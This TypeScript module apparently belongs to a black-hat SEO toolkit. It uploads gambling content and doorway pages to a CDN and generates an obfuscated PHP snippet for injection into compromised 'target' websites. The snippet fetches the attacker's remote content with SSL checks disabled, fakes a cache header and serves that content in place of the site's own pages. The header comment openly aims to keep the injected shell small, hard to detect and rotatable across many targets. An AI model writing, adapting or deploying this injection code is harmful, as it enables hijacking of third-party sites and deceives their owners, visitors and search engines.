/**
 * Content CDN — Hosts gambling SEO content on external CDN
 * 
 * Instead of embedding content in the PHP shell (detectable),
 * this module uploads content to S3/CDN and returns URLs.
 * The injected PHP code fetches content from CDN at runtime.
 * 
 * Benefits:
 * - Shell stays tiny and hard to detect
 * - Content can be updated without touching the target
 * - Multiple targets can share the same content CDN
 * - Content rotates to avoid duplicate detection
 */

import { storagePut } from "./storage";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface CdnUploadConfig {
  /** Primary keyword for the content */
  primaryKeyword: string;
  /** All keywords */
  keywords: string[];
  /** Brand name */
  brandName: string;
  /** Redirect URL for CTAs */
  redirectUrl: string;
  /** Target domain (for organizing content) */
  targetDomain: string;
  /** HTML content to upload */
  htmlContent: string;
  /** Doorway pages to upload */
  doorwayPages?: Array<{ slug: string; html: string }>;
}

export interface CdnUploadResult {
  success: boolean;
  /** Main landing page CDN URL */
  mainPageUrl: string;
  /** Doorway page CDN URLs */
  doorwayPageUrls: Array<{ slug: string; url: string }>;
  /** All uploaded URLs */
  allUrls: string[];
  /** Content key prefix for management */
  contentKeyPrefix: string;
  errors: string[];
}

type ProgressCallback = (detail: string) => void;

// ═══════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════

function randomStr(len: number): string {
  return Array.from({ length: len }, () => "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * 36)]).join("");
}

function sanitizeDomain(domain: string): string {
  return domain.replace(/^https?:\/\//, "").replace(/[^a-zA-Z0-9.-]/g, "_").replace(/\./g, "-");
}

// ═══════════════════════════════════════════════════════
//  MAIN: Upload Content to CDN
// ═══════════════════════════════════════════════════════

export async function uploadContentToCdn(
  config: CdnUploadConfig,
  onProgress: ProgressCallback = () => {},
): Promise<CdnUploadResult> {
  const errors: string[] = [];
  const allUrls: string[] = [];
  const doorwayPageUrls: Array<{ slug: string; url: string }> = [];
  let mainPageUrl = "";
  
  // Generate unique content key prefix
  const domainKey = sanitizeDomain(config.targetDomain);
  const contentKeyPrefix = `seo-content/${domainKey}/${randomStr(8)}`;
  
  onProgress(`📤 กำลังอัพโหลด content ไป CDN (prefix: ${contentKeyPrefix})...`);

  // Step 1: Upload main landing page
  try {
    const mainKey = `${contentKeyPrefix}/index-${randomStr(6)}.html`;
    const result = await storagePut(mainKey, Buffer.from(config.htmlContent, "utf-8"), "text/html");
    mainPageUrl = result.url;
    allUrls.push(mainPageUrl);
    onProgress(`✅ Main page uploaded: ${mainPageUrl.substring(0, 60)}...`);
  } catch (error: any) {
    errors.push(`Main page upload failed: ${error.message}`);
    onProgress(`❌ Main page upload failed: ${error.message}`);
  }

  // Step 2: Upload doorway pages
  if (config.doorwayPages && config.doorwayPages.length > 0) {
    onProgress(`📤 กำลังอัพโหลด ${config.doorwayPages.length} doorway pages...`);
    
    for (const page of config.doorwayPages) {
      try {
        const pageKey = `${contentKeyPrefix}/doorway/${page.slug}-${randomStr(4)}.html`;
        const result = await storagePut(pageKey, Buffer.from(page.html, "utf-8"), "text/html");
        doorwayPageUrls.push({ slug: page.slug, url: result.url });
        allUrls.push(result.url);
      } catch (error: any) {
        errors.push(`Doorway page "${page.slug}" upload failed: ${error.message}`);
      }
    }
    
    onProgress(`✅ อัพโหลด ${doorwayPageUrls.length}/${config.doorwayPages.length} doorway pages สำเร็จ`);
  }

  // Step 3: Upload a sitemap for the content (helps with indexing)
  if (mainPageUrl && doorwayPageUrls.length > 0) {
    try {
      const sitemapXml = generateContentSitemap(mainPageUrl, doorwayPageUrls);
      const sitemapKey = `${contentKeyPrefix}/sitemap-${randomStr(4)}.xml`;
      const result = await storagePut(sitemapKey, Buffer.from(sitemapXml, "utf-8"), "application/xml");
      allUrls.push(result.url);
      onProgress(`✅ Content sitemap uploaded`);
    } catch {
      // Non-critical, ignore
    }
  }

  return {
    success: mainPageUrl !== "",
    mainPageUrl,
    doorwayPageUrls,
    allUrls,
    contentKeyPrefix,
    errors,
  };
}

// ═══════════════════════════════════════════════════════
//  CONTENT ROTATION
// ═══════════════════════════════════════════════════════

/**
 * Upload multiple content variants for rotation.
 * The PHP injection code can randomly pick from these URLs.
 */
export async function uploadContentVariants(
  configs: CdnUploadConfig[],
  onProgress: ProgressCallback = () => {},
): Promise<{ urls: string[]; errors: string[] }> {
  const urls: string[] = [];
  const errors: string[] = [];

  onProgress(`📤 กำลังอัพโหลด ${configs.length} content variants...`);

  for (let i = 0; i < configs.length; i++) {
    const config = configs[i];
    try {
      const key = `seo-content/${sanitizeDomain(config.targetDomain)}/variant-${i}-${randomStr(6)}.html`;
      const result = await storagePut(key, Buffer.from(config.htmlContent, "utf-8"), "text/html");
      urls.push(result.url);
    } catch (error: any) {
      errors.push(`Variant ${i} upload failed: ${error.message}`);
    }
  }

  onProgress(`✅ อัพโหลด ${urls.length}/${configs.length} variants สำเร็จ`);

  return { urls, errors };
}

// ═══════════════════════════════════════════════════════
//  CONTENT SITEMAP
// ═══════════════════════════════════════════════════════

function generateContentSitemap(
  mainUrl: string,
  doorwayUrls: Array<{ slug: string; url: string }>,
): string {
  const now = new Date().toISOString().split("T")[0];
  
  let xml = `<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>${mainUrl}</loc>
    <lastmod>${now}</lastmod>
    <changefreq>daily</changefreq>
    <priority>1.0</priority>
  </url>`;

  for (const page of doorwayUrls) {
    xml += `
  <url>
    <loc>${page.url}</loc>
    <lastmod>${now}</lastmod>
    <changefreq>daily</changefreq>
    <priority>0.8</priority>
  </url>`;
  }

  xml += `
</urlset>`;

  return xml;
}

// ═══════════════════════════════════════════════════════
//  GENERATE PHP SNIPPET FOR CDN CONTENT FETCHING
// ═══════════════════════════════════════════════════════

/**
 * Generate a minimal PHP snippet that fetches content from CDN.
 * This is what gets injected into target files instead of embedding full HTML.
 */
export function generateCdnFetchSnippet(cdnUrl: string, fallbackHtml?: string): string {
  const v = Array.from({ length: 5 }, () => `$_${Array.from({ length: 6 }, () => "abcdefghijklmnopqrstuvwxyz"[Math.floor(Math.random() * 26)]).join("")}`);
  
  const fallbackB64 = fallbackHtml ? Buffer.from(fallbackHtml).toString("base64") : "";
  
  return `
${v[0]}="${cdnUrl}";
${v[1]}=@file_get_contents(${v[0]});
if(!${v[1]}){
  $ch=curl_init(${v[0]});
  curl_setopt_array($ch,array(CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>10,CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_FOLLOWLOCATION=>true));
  ${v[1]}=curl_exec($ch);
  curl_close($ch);
}
if(${v[1]}){
  header("Content-Type:text/html;charset=UTF-8");
  header("HTTP/1.1 200 OK");
  header("X-Cache:HIT");
  echo ${v[1]};
  exit;
}${fallbackB64 ? `else{echo base64_decode("${fallbackB64}");exit;}` : ""}
`.trim();
}
